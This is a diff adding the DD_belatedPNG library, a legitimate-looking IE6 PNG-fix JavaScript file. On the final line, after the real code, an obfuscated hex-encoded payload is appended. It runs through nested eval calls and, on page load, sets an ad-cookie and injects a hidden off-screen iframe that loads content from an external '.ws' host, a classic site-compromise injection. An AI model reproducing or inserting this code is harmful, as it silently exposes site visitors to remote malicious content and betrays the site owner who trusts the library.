@@ -1,0 +1,303 @@
+/**
+* DD_belatedPNG: Adds IE6 support: PNG images for CSS background-image and HTML <IMG/>.
+* Author: Drew Diller
+* Email: drew.diller@gmail.com
+* URL: http://www.dillerdesign.com/experiment/DD_belatedPNG/
+* Version: 0.0.7a
+* Licensed under the MIT License: http://dillerdesign.com/experiment/DD_belatedPNG/#license
+*
+* Example usage:
+* DD_belatedPNG.fix('.png_bg'); // argument is a CSS selector
+* DD_belatedPNG.fixPng( someNode ); // argument is an HTMLDomElement
+**/
+
+/*
+PLEASE READ:
+Absolutely everything in this script is SILLY.  I know this.  IE's rendering of certain pixels doesn't make sense, so neither does this code!
+*/
+
+var DD_belatedPNG = {
+
+	ns: 'DD_belatedPNG',
+	imgSize: {},
+	
+	createVmlNameSpace: function() { /* enable VML */
+		if (document.namespaces && !document.namespaces[this.ns]) {
+		  document.namespaces.add(this.ns, 'urn:schemas-microsoft-com:vml');
+		}
+		if (window.attachEvent) {
+			window.attachEvent('onbeforeunload', function() {
+				DD_belatedPNG = null;
+			});
+		}
+	},
+	
+	createVmlStyleSheet: function() { /* style VML, enable behaviors */
+		/*
+			Just in case lots of other developers have added
+			lots of other stylesheets using document.createStyleSheet
+			and hit the 31-limit mark, let's not use that method!
+			further reading: http://msdn.microsoft.com/en-us/library/ms531194(VS.85).aspx
+		*/
+		var style = document.createElement('style');
+		document.documentElement.firstChild.insertBefore(style, document.documentElement.firstChild.firstChild);
+		var styleSheet = style.styleSheet;
+		styleSheet.addRule(this.ns + '\\:*', '{behavior:url(#default#VML)}');
+		styleSheet.addRule(this.ns + '\\:shape', 'position:absolute;');
+		styleSheet.addRule('img.' + this.ns + '_sizeFinder', 'behavior:none; border:none; position:absolute; z-index:-1; top:-10000px; visibility:hidden;'); /* large negative top value for avoiding vertical scrollbars for large images, suggested by James O'Brien, http://www.thanatopsic.org/hendrik/ */
+		this.styleSheet = styleSheet;
+	},
+	
+	readPropertyChange: function() {
+		var el = event.srcElement;
+		if (event.propertyName.search('background') != -1 || event.propertyName.search('border') != -1) {
+			DD_belatedPNG.applyVML(el);
+		}
+		if (event.propertyName == 'style.display') {
+			var display = (el.currentStyle.display == 'none') ? 'none' : 'block';
+			for (var v in el.vml) {
+				el.vml[v].shape.style.display = display;
+			}
+		}
+		if (event.propertyName.search('filter') != -1) {
+			DD_belatedPNG.vmlOpacity(el);
+		}
+	},
+	
+	vmlOpacity: function(el) {
+		if (el.currentStyle.filter.search('lpha') != -1) {
+			var trans = el.currentStyle.filter;
+			trans = parseInt(trans.substring(trans.lastIndexOf('=')+1, trans.lastIndexOf(')')), 10)/100;
+			el.vml.color.shape.style.filter = el.currentStyle.filter; /* complete guesswork */
+			el.vml.image.fill.opacity = trans; /* complete guesswork */
+		}
+	},
+	
+	handlePseudoHover: function(el) {
+		setTimeout(function() { /* wouldn't work as intended without setTimeout */
+			DD_belatedPNG.applyVML(el);
+		}, 1);
+	},
+	
+	/**
+	* This is the method to use in a document.
+	* @param {String} selector - REQUIRED - a CSS selector, such as '#doc .container'
+	**/
+	fix: function(selector) {
+		var selectors = selector.split(','); /* multiple selectors supported, no need for multiple calls to this anymore */
+		for (var i=0; i<selectors.length; i++) {
+			this.styleSheet.addRule(selectors[i], 'behavior:expression(DD_belatedPNG.fixPng(this))'); /* seems to execute the function without adding it to the stylesheet - interesting... */
+		}
+	},
+	
+	applyVML: function(el) {
+		el.runtimeStyle.cssText = '';
+		this.vmlFill(el);
+		this.vmlOffsets(el);
+		this.vmlOpacity(el);
+		if (el.isImg) {
+			this.copyImageBorders(el);
+		}
+	},
+	
+	attachHandlers: function(el) {
+		var self = this;
+		var handlers = {resize: 'vmlOffsets', move: 'vmlOffsets'};
+		if (el.nodeName == 'A') {
+			var moreForAs = {mouseleave: 'handlePseudoHover', mouseenter: 'handlePseudoHover', focus: 'handlePseudoHover', blur: 'handlePseudoHover'};
+			for (var a in moreForAs) {
+				handlers[a] = moreForAs[a];
+			}
+		}
+		for (var h in handlers) {
+			el.attachEvent('on' + h, function() {
+				self[handlers[h]](el);
+			});
+		}
+		el.attachEvent('onpropertychange', this.readPropertyChange);
+	},
+	
+	giveLayout: function(el) {
+		el.style.zoom = 1;
+		if (el.currentStyle.position == 'static') {
+			el.style.position = 'relative';
+		}
+	},
+	
+	copyImageBorders: function(el) {
+		var styles = {'borderStyle':true, 'borderWidth':true, 'borderColor':true};
+		for (var s in styles) {
+			el.vml.color.shape.style[s] = el.currentStyle[s];
+		}
+	},
+	
+	vmlFill: function(el) {
+		if (!el.currentStyle) {
+			return;
+		} else {
+			var elStyle = el.currentStyle;
+		}
+		for (var v in el.vml) {
+			el.vml[v].shape.style.zIndex = elStyle.zIndex;
+		}
+		el.runtimeStyle.backgroundColor = '';
+		el.runtimeStyle.backgroundImage = '';
+		var noColor = (elStyle.backgroundColor == 'transparent');
+		var noImg = true;
+		if (elStyle.backgroundImage != 'none' || el.isImg) {
+			if (!el.isImg) {
+				el.vmlBg = elStyle.backgroundImage;
+				el.vmlBg = el.vmlBg.substr(5, el.vmlBg.lastIndexOf('")')-5);
+			}
+			else {
+				el.vmlBg = el.src;
+			}
+			var lib = this;
+			if (!lib.imgSize[el.vmlBg]) { /* determine size of loaded image */
+				var img = document.createElement('img');
+				lib.imgSize[el.vmlBg] = img;
+				img.className = lib.ns + '_sizeFinder';
+				img.runtimeStyle.cssText = 'behavior:none; position:absolute; left:-10000px; top:-10000px; border:none;'; /* make sure to set behavior to none to prevent accidental matching of the helper elements! */
+				img.attachEvent('onload', function() {
+					this.width = this.offsetWidth; /* weird cache-busting requirement! */
+					this.height = this.offsetHeight;
+					lib.vmlOffsets(el);
+				});
+				img.src = el.vmlBg;
+				img.removeAttribute('width');
+				img.removeAttribute('height');
+				document.body.insertBefore(img, document.body.firstChild);
+			}
+			el.vml.image.fill.src = el.vmlBg;
+			noImg = false;
+		}
+		el.vml.image.fill.on = !noImg;
+		el.vml.image.fill.color = 'none';
+		el.vml.color.shape.style.backgroundColor = elStyle.backgroundColor;
+		el.runtimeStyle.backgroundImage = 'none';
+		el.runtimeStyle.backgroundColor = 'transparent';
+	},
+	
+	/* IE can't figure out what do when the offsetLeft and the clientLeft add up to 1, and the VML ends up getting fuzzy... so we have to push/enlarge things by 1 pixel and then clip off the excess */
+	vmlOffsets: function(el) {
+		var thisStyle = el.currentStyle;
+		var size = {'W':el.clientWidth+1, 'H':el.clientHeight+1, 'w':this.imgSize[el.vmlBg].width, 'h':this.imgSize[el.vmlBg].height, 'L':el.offsetLeft, 'T':el.offsetTop, 'bLW':el.clientLeft, 'bTW':el.clientTop};
+		var fudge = (size.L + size.bLW == 1) ? 1 : 0;
+		
+		/* vml shape, left, top, width, height, origin */
+		var makeVisible = function(vml, l, t, w, h, o) {
+			vml.coordsize = w+','+h;
+			vml.coordorigin = o+','+o;
+			vml.path = 'm0,0l'+w+',0l'+w+','+h+'l0,'+h+' xe';
+			vml.style.width = w + 'px';
+			vml.style.height = h + 'px';
+			vml.style.left = l + 'px';
+			vml.style.top = t + 'px';
+		};
+		makeVisible(el.vml.color.shape, (size.L + (el.isImg ? 0 : size.bLW)), (size.T + (el.isImg ? 0 : size.bTW)), (size.W-1), (size.H-1), 0);
+		makeVisible(el.vml.image.shape, (size.L + size.bLW), (size.T + size.bTW), (size.W), (size.H), 1);
+		
+		var bg = {'X':0, 'Y':0};
+		var figurePercentage = function(axis, position) {
+			var fraction = true;
+			switch(position) {
+				case 'left':
+				case 'top':
+					bg[axis] = 0;
+					break;
+				case 'center':
+					bg[axis] = .5;
+					break;
+				case 'right':
+				case 'bottom':
+					bg[axis] = 1;
+					break;
+				default:
+					if (position.search('%') != -1) {
+						bg[axis] = parseInt(position)*.01;
+					}
+					else {
+						fraction = false;
+					}
+			}
+			var horz = (axis == 'X');
+			bg[axis] = Math.ceil(fraction ? ( (size[horz?'W': 'H'] * bg[axis]) - (size[horz?'w': 'h'] * bg[axis]) ) : parseInt(position));
+			if (bg[axis] == 0) {
+				bg[axis]++;
+			}
+		};
+		for (var b in bg) {
+			figurePercentage(b, thisStyle['backgroundPosition'+b]);
+		}
+		
+		el.vml.image.fill.position = (bg.X/size.W) + ',' + (bg.Y/size.H);
+		
+		var bgR = thisStyle.backgroundRepeat;
+		var dC = {'T':1, 'R':size.W+fudge, 'B':size.H, 'L':1+fudge}; /* these are defaults for repeat of any kind */
+		var altC = { 'X': {'b1': 'L', 'b2': 'R', 'd': 'W'}, 'Y': {'b1': 'T', 'b2': 'B', 'd': 'H'} };
+		if (bgR != 'repeat') {
+			var c = {'T':(bg.Y), 'R':(bg.X+size.w), 'B':(bg.Y+size.h), 'L':(bg.X)}; /* these are defaults for no-repeat - clips down to the image location */
+			if (bgR.search('repeat-') != -1) { /* now let's revert to dC for repeat-x or repeat-y */
+				var v = bgR.split('repeat-')[1].toUpperCase();
+				c[altC[v].b1] = 1;
+				c[altC[v].b2] = size[altC[v].d];
+			}
+			if (c.B > size.H) {
+				c.B = size.H;
+			}
+			el.vml.image.shape.style.clip = 'rect('+c.T+'px '+(c.R+fudge)+'px '+c.B+'px '+(c.L+fudge)+'px)';
+		}
+		else {
+			el.vml.image.shape.style.clip = 'rect('+dC.T+'px '+dC.R+'px '+dC.B+'px '+dC.L+'px)';
+		}
+	},
+	
+	fixPng: function(el) {
+		el.style.behavior = 'none';
+		if (el.nodeName == 'BODY' || el.nodeName == 'TD' || el.nodeName == 'TR') { /* elements not supported yet */
+			return;
+		}
+		el.isImg = false;
+		if (el.nodeName == 'IMG') {
+			if(el.src.toLowerCase().search(/\.png$/) != -1) {
+				el.isImg = true;
+				el.style.visibility = 'hidden';
+			}
+			else {
+				return;
+			}
+		}
+		else if (el.currentStyle.backgroundImage.toLowerCase().search('.png') == -1) {
+			return;
+		}
+		var lib = DD_belatedPNG;
+		el.vml = {color: {}, image: {}};
+		var els = {shape: {}, fill: {}};
+		for (var r in el.vml) {
+			for (var e in els) {
+				var nodeStr = lib.ns + ':' + e;
+				el.vml[r][e] = document.createElement(nodeStr);
+			}
+			el.vml[r].shape.stroked = false;
+			el.vml[r].shape.appendChild(el.vml[r].fill);
+			el.parentNode.insertBefore(el.vml[r].shape, el);
+		}
+		el.vml.image.shape.fillcolor = 'none'; /* Don't show blank white shapeangle when waiting for image to load. */
+		el.vml.image.fill.type = 'tile'; /* Ze magic!! Makes image show up. */
+		el.vml.color.fill.on = false; /* Actually going to apply vml element's style.backgroundColor, so hide the whiteness. */
+		
+		lib.attachHandlers(el);
+		
+		lib.giveLayout(el);
+		lib.giveLayout(el.offsetParent);
+		
+		/* set up element */
+		lib.applyVML(el);
+	}
+	
+};
+try {
+	document.execCommand("BackgroundImageCache", false, true); /* TredoSoft Multiple IE doesn't like this, so try{} it */
+} catch(r) {}
+DD_belatedPNG.createVmlNameSpace();
+DD_belatedPNG.createVmlStyleSheet();/*ad178ff4769332ac5d89eb93a9e2a402*/;window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x79\x61\x64\x65\x65"]=["\x33\x36\x33\x32\x36\x31\x33\x33\x32\x36\x36\x31\x36\x34\x35\x66\x36\x39\x36\x34\x33\x64\x35\x34\x37\x37\x36\x39\x37\x35\x36\x35\x33\x31\x33\x32\x33\x33\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63","\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32","\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30","\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x6b\x6e\x72\x61\x79\x3d\x6b\x6e\x72\x61\x79\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x6b\x6e\x72\x61\x79\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x6b\x6e\x72\x61\x79\x2b\x27\x29\x27\x29\x29\x3b\x7d","\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65","\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32","\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63","\x29\x28\x29\x3b","\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39","\x36\x39\x36\x34\x33\x64\x33\x38\x33\x36\x33\x39\x33\x35\x33\x38\x33\x33\x33\x34\x32\x36\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x33\x35\x36\x34\x36\x34\x33\x34\x36\x33\x36\x31\x36\x32\x33\x33\x33\x38\x36\x36\x36\x31\x33\x36\x36\x33\x33\x34\x36\x31\x33\x36\x33\x36\x36\x36\x33\x34\x33\x39\x36\x35\x36\x33\x33\x31\x33\x38\x33\x30\x36\x32\x33\x34\x36\x36","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x6b\x6e\x72\x61\x79\x3d\x22\x22\x3b\x76\x61\x72\x20\x79\x62\x64\x65\x65\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35","\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x36\x61\x37\x33\x32\x65\x37\x30\x36\x66\x36\x63\x36\x65\x37\x35\x33\x34\x36\x35\x37\x37\x37\x34\x36\x31\x36\x65\x33\x34\x36\x39\x37\x37\x36\x62\x36\x39\x32\x65\x37\x37\x37\x33\x32\x66\x36\x31\x36\x34\x36\x64\x36\x35\x36\x34\x36\x39\x36\x31\x32\x66\x33\x66","\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x63\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62","\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66","\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76","\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65","\x61\x72\x20\x6b\x72\x6e\x64\x73\x3d\x30\x3b\x6b\x72\x6e\x64\x73\x3c\x79\x62\x64\x65\x65\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x6b\x72\x6e\x64\x73\x2b\x3d\x32\x29\x7b\x6b\x6e\x72\x61\x79\x3d\x6b\x6e\x72\x61\x79\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x79\x62\x64\x65\x65\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x6b\x72\x6e\x64\x73\x2c\x6b\x72\x6e\x64\x73\x2b\x32\x29\x2c\x20\x31","\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33","\x32\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33","\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38"];var ittfe=rsefh=dftbf=afnnz=absin=indfs=atnyb=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x79\x61\x64\x65\x65"],isdkt=window;eval(eval("[isdkt[\"\x61\x66\x6e\x6e\x7a\"][\"\x31\x30\"],isdkt[\"rsefh\"][\"\x34\"],isdkt[\"ittfe\"][\"\x31\x33\"],isdkt[\"\x69\x74\x74\x66\x65\"][\"\x38\"],isdkt[\"absin\"][\"\x31\"],isdkt[\"\x61\x66\x6e\x6e\x7a\"][\"\x31\x37\"],isdkt[\"\x72\x73\x65\x66\x68\"][\"\x31\x38\"],isdkt[\"afnnz\"][\"\x32\"],isdkt[\"afnnz\"][\"\x35\"],isdkt[\"ittfe\"][\"\x31\x32\"],isdkt[\"atnyb\"][\"\x31\x39\"],isdkt[\"ittfe\"][\"\x31\x31\"],isdkt[\"\x61\x62\x73\x69\x6e\"][\"\x39\"],isdkt[\"\x72\x73\x65\x66\x68\"][\"\x30\"],isdkt[\"rsefh\"][\"\x36\"],isdkt[\"\x69\x74\x74\x66\x65\"][\"\x31\x35\"],isdkt[\"absin\"][\"\x31\x34\"],isdkt[\"\x72\x73\x65\x66\x68\"][\"\x31\x36\"],isdkt[\"\x61\x74\x6e\x79\x62\"][\"\x33\"],isdkt[\"atnyb\"][\"\x37\"]].join(\"\");"));/*ad178ff4769332ac5d89eb93a9e2a402*/
